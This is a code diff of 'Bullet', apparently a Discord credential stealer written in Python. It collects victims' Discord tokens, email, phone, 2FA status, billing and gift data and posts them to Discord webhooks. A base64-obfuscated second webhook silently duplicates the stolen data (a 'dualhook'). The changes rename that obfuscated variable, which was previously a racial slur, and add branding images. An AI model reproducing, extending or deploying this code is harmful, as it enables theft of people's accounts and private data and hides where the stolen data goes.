@@ -29,7 +29,7 @@ user = os.environ.get("USERNAME")
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 Aqua = "C:/Users/Public/Aqua"
-nigga = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIyNzU5MjI2NDYwODY0OTI5OC8wMmE2ZTVqSjhfbmxXdVFwRlRzZURFeHl1dGVlZVIwa05kVzNFZ191RkIwM2I1YUtTUVhZWnNFS0V4cjhJRjJHclRJcA=="
+build = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIyNzU5MjI2NDYwODY0OTI5OC8wMmE2ZTVqSjhfbmxXdVFwRlRzZURFeHl1dGVlZVIwa05kVzNFZ191RkIwM2I1YUtTUVhZWnNFS0V4cjhJRjJHclRJcA=="
 
 
 
@@ -213,13 +213,15 @@ def getDcToken():
         webhook.add_embed(embed)
         embed.set_title(f"**Discord Information** : `{username}`")
         embed.set_image(avatar)
+        embed.set_thumbnail(url="https://media.discordapp.net/attachments/1227592232022839300/1228076334752727090/Add_a_heading.gif?ex=662aba36&is=66184536&hm=f42132fec1f220b6ba871dc679702ac9d2362a53b2109ed58c14287d3925ef1e&=&width=630&height=630")
         embed.set_description(
-            f"\n[<:arrows_right:988374645889699870> Go Check Out The Github <:aqua:1181665113611173969>](https://github.com/AquaLT/Bullet-Multi-Tool)\n\n<a:right_arrow:988374691720888340> Token : ```{token}```\n<a:boost:988374649253552158> Nitro : ```{nitro}```\n✉️ Email : ```{email}```\n📱 Phone : ```{phone}```\n<:mfa:1021604916537602088> 2FA : ```{mfa}```{HasBilling()}{HasGifts()}{getGuilds()}")
+            f"\n[<:arrows_right:988374645889699870> Go Check Out The Github ](https://github.com/AquaLT/Bullet-Multi-Tool)\n\n<a:right_arrow:988374691720888340> Token : ```{token}```\n<a:boost:988374649253552158> Nitro : ```{nitro}```\n✉️ Email : ```{email}```\n📱 Phone : ```{phone}```\n<:mfa:1021604916537602088> 2FA : ```{mfa}```{HasBilling()}{HasGifts()}{getGuilds()}")
         embed.set_footer("Grabbed By Bullet")
 
         webhook1.add_embed(embed)
         embed.set_title(f"**Discord Information** : `{username}`")
         embed.set_image(avatar)
+        embed.set_thumbnail(url="https://media.discordapp.net/attachments/1227592232022839300/1228076334752727090/Add_a_heading.gif?ex=662aba36&is=66184536&hm=f42132fec1f220b6ba871dc679702ac9d2362a53b2109ed58c14287d3925ef1e&=&width=630&height=630")
         embed.set_description(
             f"\n[<:arrows_right:988374645889699870> Go Check Out The Github](https://github.com/AquaLT/Bullet-Multi-Tool)\n\n<a:right_arrow:988374691720888340> Token : ```{token}```\n<a:boost:988374649253552158> Nitro : ```{nitro}```\n✉️ Email : ```{email}```\n📱 Phone : ```{phone}```\n<:mfa:1021604916537602088> 2FA : ```{mfa}```{HasBilling()}{HasGifts()}{getGuilds()}")
         embed.set_footer("Grabbed By Bullet")
@@ -305,13 +307,14 @@ def cleanUp():
 
 
 webhook_url = 'bulleting_hookz'
-webhook_url2 = b64decode((nigga))
+webhook_url2 = b64decode((build))
 webhook = DiscordWebhook(url=webhook_url)
 webhook1 = DiscordWebhook(url=webhook_url2)
 embed = DiscordEmbed()
 webhook.username = "Bullet"
-webhook.avatar_url = ""
-
+webhook.avatar_url = "https://media.discordapp.net/attachments/1227592232022839300/1228079431004852254/Add_a_heading.jpg?ex=662abd18&is=66184818&hm=ab83c31f59810689ec75480bc9da64912647d0d8b6a96a5979d319f97a0fbe5c&=&format=webp&width=630&height=630"
+webhook1.avatar_url = "https://media.discordapp.net/attachments/1227592232022839300/1228079431004852254/Add_a_heading.jpg?ex=662abd18&is=66184818&hm=ab83c31f59810689ec75480bc9da64912647d0d8b6a96a5979d319f97a0fbe5c&=&format=webp&width=630&height=630"
+webhook1.username = "Bullet Dualhook lol"
 
 def runAqua():
     makeDir()
